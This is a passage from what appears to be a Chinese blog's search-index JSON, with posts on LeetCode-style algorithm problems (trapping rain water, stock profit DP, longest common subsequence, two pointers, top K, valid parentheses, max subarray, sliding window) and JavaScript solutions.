个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。 * 输入: [0,1,0,2,1,0,1,3,2,1,2,1] 输出: 6*/function fn(height) &#123; let res = 0; let max = 0; let maxIndex; for (let i = 0; i &lt; height.length; i++) &#123; if (height[i] &gt; max) &#123; max = height[i]; maxIndex = i; &#125; &#125; let leftMax = 0; for (let i = 0; i &lt; maxIndex; i++) &#123; leftMax = Math.max(leftMax, height[i]); res += leftMax - height[i]; &#125; let rightMax = 0; for (let i = height.length - 1; i &gt;= maxIndex; i--) &#123; rightMax = Math.max(rightMax, height[i]); res += rightMax - height[i]; &#125; return res;&#125;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 三指针","slug":"算法题/技巧篇 - 三指针","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T09:59:41.515Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 三指针/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E4%B8%89%E6%8C%87%E9%92%88/","excerpt":"","text":"技巧篇 - 三指针1. 颜色分类 (leetcode 题目编号 75)描述给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。 此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。 示例:输入: [2,0,2,1,1,0]输出: [0,0,1,1,2,2] 解题思路 可将所求结果理解成 [0, ..., 0]、[1, ..., 1]、 [2, ..., 2] 三块 初始化0的最右边界：p0 = 0 （左闭右开区间） 初始化2的最左边界：p2 = n - 1 （左开右闭区间） 初始化当前考虑的元素序号 ：curr = 0 While (curr &lt;= p2) : 若 nums[curr] = 0 ：交换第 curr 个和第 p0 个元素，并将指针都向右移。 若 nums[curr] = 2 ：交换第 curr 个和第 p2个元素，并将 p2 指针左移。 若 nums[curr] = 1 ：将指针 curr 右移。 1234567891011121314151617181920212223var sortColors = function(nums) &#123; let swap = (a, b) =&gt; &#123; let temp = nums[a] nums[a] = nums[b] nums[b] = temp &#125; let curr = 0 let left = 0 let right = nums.length - 1 while (curr &lt;= right) &#123; if (nums[curr] === 0) &#123; swap(left++, curr--) &#125; else if (nums[curr] === 2) &#123; swap(right--, curr) &#125; else &#123; curr++ &#125; &#125; return nums&#125;;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 动态规划 - 求买卖股票求最大利润","slug":"算法题/技巧篇 - 动态规划 - 求买卖股票求最大利润","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:01:09.882Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 动态规划 - 求买卖股票求最大利润/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%20-%20%E6%B1%82%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E6%B1%82%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/","excerpt":"","text":"技巧篇 - 动态规划 - 求买卖股票求最大利润买卖股票的最佳时机（leetcode 题目编号 121）问题：给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。 如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。 注意：你不能在买入股票前卖出股票。 示例：示例 1:输入: [7,1,5,3,6,4]输出: 5解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。 注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。 示例 2:输入: [7,6,4,3,1]输出: 0解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。 思路： 遍历数组取里面的最小值作为买入价 每次比较遍历项与买入价的差值 取各差值的最大者即为最大利润 1234567891011121314var maxProfit = function(prices) &#123; let res = 0; let buy = prices[0]; for (let i = 1; i &lt; prices.length; i++) &#123; if (prices[i] &gt; buy) &#123; res = Math.max(res, prices[i] - buy); &#125; else &#123; buy = prices[i]; &#125; &#125; return res;&#125;; 买卖股票的最佳时机 II（leetcode 题目编号 122）问题：给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。 设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。 注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。 示例：示例 1:输入: [7,1,5,3,6,4]输出: 7解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。 示例 2:输入: [1,2,3,4,5]输出: 4解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。 因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。 思路： 从第二天开始，如果当前价格比之前价格高，则把差值加入利润中 1234567891011var maxProfit = function(prices) &#123; let res = 0; for (let i = 0; i &lt; prices.length - 1; i++) &#123; if (prices[i] &lt; prices[i + 1]) &#123; res += prices[i + 1] - prices[i] &#125; &#125; return res;&#125;; 买卖股票的最佳时机 III（leetcode 题目编号 123）问题：给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。 设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。 注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。 示例：示例 1:输入: [3,3,5,0,0,3,1,4]输出: 6解释: 在第 4 天（股票价格 = 0）的时候买入，在第 6 天（股票价格 = 3）的时候卖出，这笔交易所能获得利润 = 3-0 = 3 。 随后，在第 7 天（股票价格 = 1）的时候买入，在第 8 天 （股票价格 = 4）的时候卖出，这笔交易所能获得利润 = 4-1 = 3 。 示例 2:输入: [1,2,3,4,5]输出: 4解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。 注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。 因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。 思路： 定义 local[i][j] 为在到达第 i 天时最多可进行 j 次交易并且最后一次交易在最后一天卖出的最大利润，此为局部最优 定义 global[i][j] 为在到达第 i 天时最多可进行 j 次交易的最大利润，此为全局最优 局部最优值是比较前一天并少交易一次的全局最优加上大于0的差值，和前一天的局部最优加上差值中取较大值 全局最优是比较局部最优和前一天的全局最优 1234567891011121314151617181920var maxProfit = function(prices) &#123; if (!prices.length) return 0; let local = [[0, 0, 0]]; let global = [[0, 0, 0]]; for (let i = 1; i &lt; prices.length; i++) &#123; let diff = prices[i] - prices[i - 1]; local[i] = [0]; global[i] = [0]; for (let j = 1; j &lt;= 2; j++) &#123; local[i][j] = Math.max(global[i - 1][j - 1] + Math.max(diff, 0), local[i - 1][j] + diff); global[i][j] = Math.max(local[i][j], global[i - 1][j]); &#125; &#125; return global[prices.length - 1][2];&#125;; 最佳买卖股票时机含冷冻期（leetcode 题目编号 309）问题：给定一个整数数组，其中第 i 个元素代表了第 i 天的股票价格 。​ 设计一个算法计算出最大利润。在满足以下约束条件下，你可以尽可能地完成更多的交易（多次买卖一支股票）: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。卖出股票后，你无法在第二天买入股票 (即冷冻期为 1 天)。 示例：示例1: 输入: [1,2,3,0,2]输出: 3解释: 对应的交易状态为: [买入, 卖出, 冷冻期, 买入, 卖出] 思路： 设 buy[i] 表示在第 i 天之前最后一个操作是买，此时的最大收益。 设 sell[i] 表示在第 i 天之前最后一个操作是卖，此时的最大收益。 则可以得出递推公式 buy[i] = max(sell[i-2] - price, buy[i-1]) 、sell[i] = max(buy[i-1] + price, sell[i-1]) 123456789101112131415161718192021var maxProfit = function(prices) &#123; if (!prices.length) return 0; let buy = []; let sell = []; for (let i = 0; i &lt; prices.length; i++) &#123; if (i === 0) &#123; buy[i] = -prices[0]; sell[i] = 0; &#125; else if (i === 1) &#123; buy[i] = Math.max(-prices[1], buy[i - 1]); sell[i] = Math.max(prices[1] - prices[0], sell[i - 1]); &#125; else &#123; buy[i] = Math.max(sell[i - 2] - prices[i], buy[i - 1]); sell[i] = Math.max(buy[i - 1] + prices[i], sell[i - 1]); &#125; &#125; return sell[prices.length - 1];&#125;;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 动态规划","slug":"算法题/技巧篇 - 动态规划","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:02:58.585Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 动态规划/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","excerpt":"","text":"技巧篇 - 动态规划最长公共子序列（leetcode 题目编号 1143）问题：给定两个字符串 text1 和 text2，返回这两个字符串的最长公共子序列的长度。 一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。例如，”ace” 是 “abcde” 的子序列，但 “aec” 不是 “abcde” 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。 若这两个字符串没有公共子序列，则返回 0。 示例：示例 1: 输入：text1 = “abcde”, text2 = “ace”输出：3解释：最长公共子序列是 “ace”，它的长度为 3。示例 2: 输入：text1 = “abc”, text2 = “abc”输出：3解释：最长公共子序列是 “abc”，它的长度为 3。示例 3: 输入：text1 = “abc”, text2 = “def”输出：0解释：两个字符串没有公共子序列，返回 0。 思路： 指针 i、j 分别是指向 str1、str2，arr[i][j] 表示指向 i-1、j-1 时最长公共子序列的值 当 i、j 等于 0 时，表示其中一个字符串为空字符串，则 arr[i][i] 为 0 当 arr[i] !== arr[j] 时，说明指针移动时新添加的 1 个字符没有匹配上，则 arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j]) 当 arr[i] === arr[j] 时，说明指针移动时新添加的 1 个字符正好匹配上，则 arr[i][j] = arr[i - 1][j - 1] + 1 说明： 对于每次 新添加的 1 个字符，如果没有匹配上，相当于是即使其中个字符串没有最后一个字符，最长公共子序列的值也是一样的，所以此时 arr[i][i] = Math.max(arr[i][j - 1], arr[i - 1][j])如果 新添加的 1 个字符 刚好满足 arr[i] === arr[j]，当字符串1、字符串2同时去掉这个字符时最长公共子序列的值为 arr[i - 1][j - 1]，所以当同时加上这个字符时，arr[i][j] = arr[i - 1][j - 1] + 1 123456789101112131415161718192021var longestCommonSubsequence = function(text1, text2) &#123; const len1 = text1.length; const len2 = text2.length; const arr = []; for (let i = 0; i &lt;= len1; i++) &#123; arr[i] = new Array(); for (let j = 0; j &lt;= len2; j++) &#123; if (i ===0 || j === 0) &#123; arr[i][j] = 0; &#125; else if (text1[i - 1] === text2[j - 1]) &#123; arr[i][j] = arr[i - 1][j - 1] + 1; &#125; else &#123; arr[i][j] = Math.max(arr[i][j - 1], arr[i - 1][j]); &#125; &#125; &#125; return arr[len1][len2];&#125;;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 双指针","slug":"算法题/技巧篇 - 双指针","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T09:59:30.344Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 双指针/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E5%8F%8C%E6%8C%87%E9%92%88/","excerpt":"","text":"技巧篇 - 双指针1. 快慢指针说明： 主要用于链表结构中，通常初始状态时快、慢指针都指向 head 节点，前进时 fast 指针在前（速度 2n），slow 指针在后 （速度 n） 使用场景 判断链表中是否有闭环 已知链表中有闭环，求这个闭环的起始位置 寻找链表中的中间节点 寻找链表中的倒数第 k 个元素 2. 左右指针说明：主要用于数组结构中，通常初始状态时左、右针分别指向 arr[0]、arr[arr.length - 1] 使用场景 二分查找 求数值的平方根 两数之和（求有序数组中和为 target 的两个数） 反转数组 有效三角形的个数 2.1 有效三角形的个数描述：给定一个包含非负整数的数组，你的任务是统计其中可以组成三角形三条边的三元组个数。 示例：输入: [2,2,3,4]输出: 3 解释:有效的组合是:2,3,4 (使用第一个 2)2,3,4 (使用第二个 2)2,2,3 解题思路：判断三条边能组成三角形的条件为： 任意两边之和大于第三边，任意两边之差小于第三边。 如果三条边长从小到大为 a、b、c，当且仅当 a + b &gt; c 这三条边能组成三角形。 1234567891011121314151617181920212223242526272829/** * --暴力破解-- * 使用三重循环枚举 * 时间复杂度为 O(n^3)*/function triangleNumber(nums) &#123; if (nums.length &lt; 3) return 0 let result = 0 let checkResult = function(a, b, c) &#123; const flag = a + b &gt; c &amp;&amp; a + c &gt; b &amp;&amp; b + c &gt; a if (flag) result++ &#125; for (let i = 0; i &lt; nums.length - 2; i++) &#123; for (let j = i + 1; j &lt; nums.length - 1; j++) &#123; for (let k = j + 1; k &lt; nums.length; k++) &#123; checkResult(nums[i], nums[j], nums[k]) &#125; &#125; &#125; return result&#125;console.log(triangleNumber([2,2,3,4])) // 3console.log(triangleNumber([1,1,3,4])) // 0console.log(triangleNumber([24,3,82,22,35,84,19])) // 20 1234567891011121314151617181920212223242526272829303132333435363738/** * -- 二分查找 -- * 1. 首先对数组排序。 * 2. 固定最短的两条边，二分查找最后一个小于两边之和的位置。可以求得固定两条边长之和满足条件的结果。枚举* 结束后，总和就是答案。 * 时间复杂度为 O(n^2logn)*/function triangleNumber(nums) &#123; if (nums.length &lt; 3) return 0 nums.sort((a, b) =&gt; a - b) let count = 0 let searchPosition = (left, right, sum) =&gt; &#123; while (left &lt;= right &amp;&amp; right &lt; nums.length) &#123; let middle = Math.floor((left + right + 1) / 2) if (nums[middle] &gt;= sum) &#123; right = middle - 1 &#125; else &#123; left = middle + 1 &#125; &#125; return Math.floor(left) &#125; let len = nums.length for(let i = 0; i &lt; len - 2; i++) &#123; for (let j = i + 1; j &lt; len - 1; j++) &#123; if (nums[i] !== 0) &#123; // 某条边为 0 时不能形成三角形 k = searchPosition(j + 1, len - 1, nums[i] + nums[j]) count += k - j - 1 &#125; &#125; &#125; return count&#125; 1234567891011121314151617181920212223242526272829303132333435/** * -- 双指针 -- * 1. 首先对数组排序。 * 2. 固定最长的一条边，运用双指针扫描 * 2.1 如果 nums[l] + nums[r] &gt; nums[i]，同时说明 nums[l + 1] + nums[r] &gt; nums[i], ..., nums[r - 1] + nums[r] &gt; nums[i]，满足的条件的有 r - l 种，r 左移进入下一轮。 * 2.2 如果 nums[l] + nums[r] &lt;= nums[i]，l 右移进入下一轮。 * 枚举结束后，总和就是答案。 * 时间复杂度为 O(n^2) )。*/function triangleNumber(nums) &#123; if (nums.length &lt; 3) return 0 nums.sort((a, b) =&gt; a - b) let count = 0 let len = nums.length for (let i = len - 1; i &gt;= 2; --i) &#123; let left = 0; let right = i - 1; while (left &lt; right) &#123; if (nums[left] + nums[right] &gt; nums[i]) &#123; count += right - left --right &#125; else &#123; ++left &#125; &#125; &#125; return count&#125;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 多种排序算法 - top K 问题","slug":"算法题/技巧篇 - 多种排序算法 - top K 问题","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:00:22.423Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 多种排序算法 - top K 问题/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E5%A4%9A%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%20-%20top%20K%20%E9%97%AE%E9%A2%98/","excerpt":"","text":"技巧篇 - 多种排序算法 - top K 问题 问题描述：从 arr 这 n 个数中，找出最大的 k 个数输入: [1, 4, 2, 7, 5, 3, 8, 6], 4输出: [5, 6, 7, 8] 1. 数组全排序步骤： 对数组 arr 进行全排序，如使用快排 取出最大的 k 个数 时间复杂度为：nlgn，优化点为：不需要对所有数据都排序 2. 局部排序步骤： 使用冒泡排序算法的思路，遍历一次数组，找出最大的数字 重复上面的步骤，知道找出最大的 k 个数字 时间复杂度：n·k，优化点为：可以不必对这 k 个数字排序 3. 使用堆排序选出最大的 k 个元素步骤： 选前 k 个元素，构建小根堆， 选第 k + 1 个元素，与堆顶元素比较，如果该元素大于堆顶元素，则替换堆顶元素并调整堆结构，否则忽略该元素 重复上一步，直指所有元素都扫描完，此时堆结构里为最大的 k 个元素 时间复杂度：nlgk 4. 使用快排思路解决减治法：分治法的一种，是把一个大的问题，转化为若干个子问题），这些子问题中只需要解决一个，便可以得到大问题的解，例如 二分查找、寻找平方根 思路：使用减治法先找出第 k 大的数，然后再找出 top K 的结果 步骤： 找到 i = partition(arr, low, high)，利用快排的思路实现 partition，使得 i 左边的元素小于 arr[i]，i 右边的元素大于 arr[i] 如果 i 等于 k，则 i 右边的元素为问题的解 如果 i 小于 k，则说明说明第 k 大的元素在 arr[i] 的右边，于是只递归 arr[i+1, n] 里第 k 大的元素即可； 如果 i 大于 k，则说明 arr[i] 左边的元素都大于 k，于是只递归 arr[1, i-1] 里第 k 大的元素即可； 重复以上步骤，当 i = k 时，即到找出最大的 k 个数","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 栈结构","slug":"算法题/技巧篇 - 栈结构","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:03:36.815Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 栈结构/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E6%A0%88%E7%BB%93%E6%9E%84/","excerpt":"","text":"技巧篇 - 栈结构判断是否有有效的括号问题：给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。 有效字符串需满足： 左括号必须用相同类型的右括号闭合。 左括号必须以正确的顺序闭合。 注意空字符串可被认为是有效字符串。 示例：输入: “()[]{}”输出: true 输入: “([)]”输出: false 123456789101112131415161718192021var isValid = function(s) &#123; const stack = []; for (let i = 0; i &lt; s.length; i++) &#123; const char = s[i]; if ([&#x27;(&#x27;, &#x27;&#123;&#x27;, &#x27;[&#x27;].indexOf(char) &gt; -1) &#123; stack.push(char); &#125; else &#123; if (!stack.length) return false; const top = stack.pop(); if (top === &#x27;(&#x27; &amp;&amp; char !== &#x27;)&#x27;) return false; if (top === &#x27;[&#x27; &amp;&amp; char !== &#x27;]&#x27;) return false; if (top === &#x27;&#123;&#x27; &amp;&amp; char !== &#x27;&#125;&#x27;) return false; &#125; &#125; return stack.length === 0;&#125;; 有效括号的子串的最大长度问题：给定一个只包含 ‘(‘ 和 ‘)’ 的字符串，找出最长的包含有效括号的子串的长度。 示例：输入: “(()”输出: 2解释: 最长有效括号子串为 “()” 输入: “)()())”输出: 4解释: 最长有效括号子串为 “()()” 思路： 遍历整个字符串，res 保存遍历过程中满足条件的最大值，start 表示为起始位置 如果遇到 ( 则把对应的索引压入栈 stack 中 如果遇到 ) 则进行一下判断 如果当前栈为空，说明已匹配完成，将 start 设置为 i + 1 如果当前栈不为空，则取出栈顶元素，并再进行下一步判断 如果此时栈为空，说明取出后刚好匹配完成，将 res 设置为 Math.max(res, i - start + 1); 如果此时栈不为空，说明指匹配到了部分元素，将 res 设置为 Math.max(res, i - stack.top()) 12345678910111213141516171819202122232425var longestValidParentheses = function(s) &#123; let stack = []; let res = 0; let start = 0; for (let i = 0; i &lt; s.length; i++) &#123; if (s[i] === &#x27;(&#x27;) &#123; stack.push(i); &#125; else if (s[i] === &#x27;)&#x27;) &#123; if (stack.length === 0) &#123; start = i + 1; &#125; else &#123; stack.pop(); if (stack.length === 0) &#123; res = Math.max(res, i - start + 1); &#125; else &#123; res = Math.max(res, i - stack[stack.length - 1]); &#125; &#125; &#125; &#125; return res;&#125;;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 动态规划 - 求子数组的最值问题","slug":"算法题/技巧篇 - 动态规划 - 求子数组的最值问题","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:02:02.047Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 动态规划 - 求子数组的最值问题/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%20-%20%E6%B1%82%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/","excerpt":"","text":"技巧篇 - 动态规划 - 求子数组的最值问题1. 子数组和最大描述：给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。 示例: 输入: [-2,1,-3,4,-1,2,1,-5,4],输出: 6解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 解题思路：假设 max[i] 为 nums 前 i 个数字中包含数字 num[i] 的最大值，则 max[i] 必定是由 Math.max(max[i-1] + nums[i], nums[i]) 得到，遍历数组依次可得到包含 num[i] 的子数组的最大值， (i 从 0 ~ n-1)，取这些最大值里面最大的一个即为结果。 1234567891011121314var maxSubArray = function(nums) &#123; if (!nums.length) return 0; let max = nums[0]; let res = max; for (let i = 1; i &lt; nums.length; i++) &#123; max = Math.max(nums[i], max + nums[i]); res = Math.max(max, res); &#125; return res;&#125;; 2. 子数组乘积最大描述：给定一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字）。 示例 1: 输入: [3]输出: 3解释: 子数组 [3] 有最大乘积 3。 示例 1: 输入: [2,3,-2,4]输出: 6解释: 子数组 [2,3] 有最大乘积 6。 示例 2: 输入: [-2,0,-1]输出: 0解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。 解题思路：假设 max[i]、min[i] 分别为 nums 前 i 个数字中包含数字 i 的最大值和最小值，则 max[i]、min[i] 必定是由以下方式得到的： nums[i] &gt;= 0, 则是由 Math.max(nums[i], max[i - 1] * nums[i]) 得到 nums[i] &lt; 0, 则是由 Math.max(nums[i], min[i - 1] * nums[i]) 得到 由此可得到包含数字 num[i] 为子数组的最大值，然后取 max[0] ~ max[n - 1] 的最大值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 解法 1var maxProduct = function(nums) &#123; if (!nums.length) return 0; let max = nums[0]; let min = nums[0]; let res = max; for (let i = 1; i &lt; nums.length; i++) &#123; let tempMax = max; let tempMin = min; max = Math.max(Math.max(nums[i], tempMax * nums[i]), tempMin * nums[i]); min = Math.min(Math.min(nums[i], tempMax * nums[i]), tempMin * nums[i]); res = Math.max(max, res); &#125; return res;&#125;;// 解法 2var maxProduct = function(nums) &#123; if (!nums.length) return 0; let max = nums[0]; let min = nums[0]; let res = max; for (let i = 1; i &lt; nums.length; i++) &#123; if (nums[i] &gt;= 0) &#123; max = Math.max(nums[i], max * nums[i]); min = Math.min(nums[i], min * nums[i]); &#125; else if (nums[i] &lt; 0) &#123; let tempMax = max; max = Math.max(nums[i], min * nums[i]); min = Math.min(nums[i], tempMax * nums[i]); &#125; res = Math.max(max, res); &#125; return res;&#125;;// 解法 3var maxProduct = function(nums) &#123; if (!nums.length) return 0; let max = nums[0]; let min = nums[0]; let res = max; for (let i = 1; i &lt; nums.length; i++) &#123; if (nums[i] &lt; 0) &#123; let temp = max; max = min; min = temp; &#125; max = Math.max(nums[i], max * nums[i]); min = Math.min(nums[i], min * nums[i]); res = Math.max(max, res); &#125; return res;&#125;; 3. 除自身以外数组的乘积描述：给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。 示例: 输入: [1,2,3,4]输出: [24,12,8,6] 解题思路： 从左向右遍历作累乘处理，则 leftProducet[i] 表示前 i 个数字相乘的积 从右向左遍历作累乘处理，则 rightProducet[i] 表示后 i 个数字相乘的积（不包括第 i 个数字） res[i] = leftProducet[i] * rightProducet[i] 表示除了第 i 个数字外的其他数字的乘积 1234567891011121314151617181920var productExceptSelf = function(nums) &#123; let res = []; let len = nums.length; let leftProducet = [1]; let rightProducet = []; rightProducet[len - 1] = 1; for (let i = 0; i &lt; len; i++) &#123; leftProducet[i + 1] = leftProducet[i] * nums[i]; &#125; for (let i = len - 2; i &gt;= 0; i--) &#123; rightProducet[i] = rightProducet[i + 1] * nums[i + 1]; &#125; for (let i = 0; i &lt; len; i++) &#123; res[i] = leftProducet[i] * rightProducet[i]; &#125; return res;&#125;;","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"技巧篇 - 滑动窗口","slug":"算法题/技巧篇 - 滑动窗口","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T10:04:25.302Z","comments":true,"path":"2021/05/24/算法题/技巧篇 - 滑动窗口/","link":"","permalink":"https://xuxb.github.io/2021/05/24/%E7%AE%97%E6%B3%95%E9%A2%98/%E6%8A%80%E5%B7%A7%E7%AF%87%20-%20%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/","excerpt":"","text":"技巧篇 - 滑动窗口滑动窗口问题经常使用双指针，定义两个变量left、right（只能向右移动），来标示一个窗口的大小，通过移动右指针找到问题的解，移动左指针找到问题的最优解 [0, slow) 的区域为滑动窗口已经探索过的区域 [slow, fast]的区域为滑动窗口正在探索的区域 (fast, end of array)为待探索的区域 固定大小的滑动窗口: 当快指针增加的时候慢指针必须增加 非固定大小的滑动窗口: 快指针增加，慢指针不一定变化 长度为 K 的子数组的最大值问题：给定一组大小为 n 的整数数组， 计算长度为 k 的子数组和的最大值。 示例：输入: a = [-1, 4, 7, -3, 8, 5, -2, 6], k = 3输出: 12 // [7, -3, 8] 思路： 先计算前 k 个值的总和 从第 k 个数到 n 个数，每次往数组末尾增加 1 个数的同时，减去第 1 个数（即只增加差值） 遍历的过程中，保存较大的值作为结果 最小覆盖子串问题：给定一个字符串 S 和一个字符串 T，请在 S 中找出包含 T 所有字母的最小子串。 示例：输入: S = “ADOBECODEBANC”, T = “ABC”输出: “BANC” 思路： 先扫描一遍 T，把对应的字符及其出现的次数存到 HashMap 中 然后遍历 S，把遍历到的字母对应的 HashMap 中的 value 减 